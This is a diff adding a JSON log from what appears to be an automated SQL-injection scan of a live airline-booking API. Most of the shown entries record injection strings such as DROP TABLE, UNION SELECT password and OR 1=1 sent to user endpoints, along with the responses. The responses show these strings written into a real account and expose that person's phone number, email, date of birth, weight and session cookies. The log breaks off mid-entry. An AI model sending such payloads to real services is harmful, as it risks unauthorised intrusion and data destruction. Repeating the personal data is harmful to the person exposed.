@@ -1,0 +1,3269 @@
+{
+  "test_start": "2025-11-05 17:48:19.801051",
+  "api_url": "https://vauntapi.flyvaunt.com",
+  "total_tests": 101,
+  "vulnerable_endpoints": [],
+  "time_anomalies": [],
+  "error_leaks": [
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_firstName",
+      "params": null,
+      "json_data": {
+        "firstName": "'; DROP TABLE users--"
+      },
+      "status_code": 200,
+      "response_length": 2030,
+      "elapsed_time": 0.3540329933166504,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903351,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"'; DROP TABLE users--\",\"middleName\":\"\",\"lastName\":\"Chopra\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymentDetails\":",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:23 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7ee-5W9YNmd0tCpszL6ra5CaVnpjDjg\"",
+        "set-cookie": "sails.sid=s%3AbAgRswHsS_KzYdG98mLMr0QM9lnPEG7d.RAxu5VYT5yszIqmBlxGzut63iGT5IpQxxY7WZia4o0g; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_firstName",
+      "params": null,
+      "json_data": {
+        "firstName": "' UNION SELECT * FROM users--"
+      },
+      "status_code": 200,
+      "response_length": 2038,
+      "elapsed_time": 0.36286234855651855,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903701,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"Chopra\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymentD",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:23 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7f6-YQBecrlj8izSuFWb9gnl9tmmp9U\"",
+        "set-cookie": "sails.sid=s%3AH-R3FjXBz_hJNYgXn-J-nS2JjHTrNPrf.hyCACZU6QXVqdifWwPPXlRqoUvlmaOh678XeMecIjtA; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_lastName",
+      "params": null,
+      "json_data": {
+        "lastName": "admin'--"
+      },
+      "status_code": 200,
+      "response_length": 2040,
+      "elapsed_time": 0.4027256965637207,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904066,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"admin'--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePaymen",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:24 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7f8-3lBMqXbhb1yPcpGnkc/rZKbH/iQ\"",
+        "set-cookie": "sails.sid=s%3AuIMfawlm8QPRXOX13GW_8osSzLIClvDw.BYbmupbz7fS3WT%2BP2hl3bvOhgOM2a3hcMeNAPnpFmvc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_lastName",
+      "params": null,
+      "json_data": {
+        "lastName": "' OR 1=1#"
+      },
+      "status_code": 200,
+      "response_length": 2041,
+      "elapsed_time": 0.3309061527252197,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904472,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"' OR 1=1#\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAccepted\":false,\"hasStripePayme",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:24 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"7f9-gEdBPrrgmmWYwessJkZ3C8U23CU\"",
+        "set-cookie": "sails.sid=s%3ABDfB5OXB-DQPFttkf1vDg58VmIt2ldwb.oW90Tg2cVxhypGHeVxcu2s8uoBSPzGfkKaHZ1a8mSn0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_lastName",
+      "params": null,
+      "json_data": {
+        "lastName": "'; INSERT INTO users VALUES('hacked')--"
+      },
+      "status_code": 200,
+      "response_length": 2071,
+      "elapsed_time": 0.33812713623046875,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904811,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaA",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:25 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"817-z/+gphpN5uJ4ioldGbQ+2bCuZRA\"",
+        "set-cookie": "sails.sid=s%3A29PtNwg78Wv-XZSic5AnihL4rWmWWdoX.PGVVvMWMhsogJMXQnQxXdZ0rSAXXETYzFac1MnoPSGw; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_email",
+      "params": null,
+      "json_data": {
+        "email": "test@test.com' OR '1'='1"
+      },
+      "status_code": 200,
+      "response_length": 2075,
+      "elapsed_time": 0.6497800350189209,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364905450,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"test@test.com' OR '1'='1\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isE",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:25 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"81b-HHgcnp4nvRo4WA227WOnQVSMxxw\"",
+        "set-cookie": "sails.sid=s%3A-B0hKLs3BLYUfTF8v9-uHUBRJrMBs3hm.KTZVzWy1CmIl4Y4MXKWxv8oUHPraffWzKvyYzK2Z4Qc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_email",
+      "params": null,
+      "json_data": {
+        "email": "' UNION SELECT password FROM users--"
+      },
+      "status_code": 200,
+      "response_length": 2087,
+      "elapsed_time": 0.6241061687469482,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906097,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:26 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"827-Ghoc3ww7YaQXRH1A7gZLlKA/4Zo\"",
+        "set-cookie": "sails.sid=s%3AGbIPTsuZv2WBxtV81WI749dGpwGH2y9U.3aWn55dsGqOfnOkGRHrG27wI7Gwtbb5J01D02OI8HUI; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "user_field_phoneNumber",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "+13035234453'; DROP TABLE--"
+      },
+      "status_code": 200,
+      "response_length": 2087,
+      "elapsed_time": 0.5997672080993652,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"827-dcnFcazRxTs4bV2+ZGB3scrCcUo\"",
+        "set-cookie": "sails.sid=s%3AFO_p1VsylIWwyxNtq1Wr47HWrzqDOGg0.1dIr4eJaVFcg%2BA5rIUJS2XJKDrFfaVQwza%2Buu%2Bs1Edg; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_id",
+      "params": {
+        "id": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17177748680114746,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AjEvwh8tjJyQ6h2qA6C4wT47qHE0nQtn0.l2ur2m4lqbBV9Nx%2BVuE15Lsv7fVgMvRN0GwOuuT24D0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_id",
+      "params": {
+        "id": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.1772305965423584,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3Ag14HNiNZZ2FYgbF1i607uhnubwk4elF3.YDs9i8Lh0Mcu4A3t7hrhPaCb6qN%2BqsO%2B4kuu8RG9J%2Fs; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_id",
+      "params": {
+        "id": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17629146575927734,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AbnZb8JDDl49i2dxml6UsEi2lhenqsivt.IV23fpIVgM49YhrMztH7h5uqTapCE57hvP%2B%2FzG0pfvM; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_search",
+      "params": {
+        "search": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.29593706130981445,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AxOlJ6WGRofycRQ0QRQNSuhlOw7BcrxLC.1dZPSdhk7Cl2NuKGIiIrDJwwlu9IXKgC1PBPsvwIrp8; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_search",
+      "params": {
+        "search": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.1798551082611084,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AfUTUuQkBvs-mVoLshpHteRJyYobIQo30.XG6mB0hqFDGflxPVj1Fe%2FDrb96Wv6twDOUNUEnufe7s; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_search",
+      "params": {
+        "search": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17128229141235352,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3A5a7v21wUt-3DlYY5gjjLzAAds1nkzeCB.9A45BsPldlV3EGXlIITYyLoseRTQAePcNGqCp3By7KE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_filter",
+      "params": {
+        "filter": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.15786099433898926,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3Ah9jTDUfSS5MyMfDQiS7fZOjFuOVn1SqF.pzk5%2FfvKk0oG3c3w8fYTcCRTuvmVV4FqqrbGLdrVZAY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_filter",
+      "params": {
+        "filter": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.19043898582458496,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AjVCSNPIL68irOsaDYcoIhyoEaCveRn3y.61HGNdimj4%2FP3rhCv8cur43VzPmu7k%2FeLHVbBRQIaGE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_filter",
+      "params": {
+        "filter": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.16017556190490723,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AipjdO4pseW53VjuGaj23PMDCsDCmX8Ng.ydWNG9gEv%2FjrUvmdnVodrkCXuafhje4epctLkBX1s4k; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_userId",
+      "params": {
+        "userId": "' OR '1'='1"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.1611945629119873,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3AuDx9VzDaXjfHzsLZaCBbTW6-6Lt8QLmr.%2FvK2F5gB4GXJp1s2XH2wG1Sszs58vEZoU%2FlcySVtajs; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_userId",
+      "params": {
+        "userId": "' OR 1=1--"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.17475032806396484,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
+        "set-cookie": "sails.sid=s%3A6TUkTAVoykkH9WQ0XSZDpUwxicoQ_TrJ.RCuOO9Fh10%2B7Sqbu7jLUA7Pbey80LqlIBUeX0%2FsfaJE; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "user_query_userId",
+      "params": {
+        "userId": "' OR 'x'='x"
+      },
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3198,
+      "elapsed_time": 0.2815570831298828,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT * FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c7e-EZYOBthQOvxTNZFkXy42Y08wZ7Y\"",
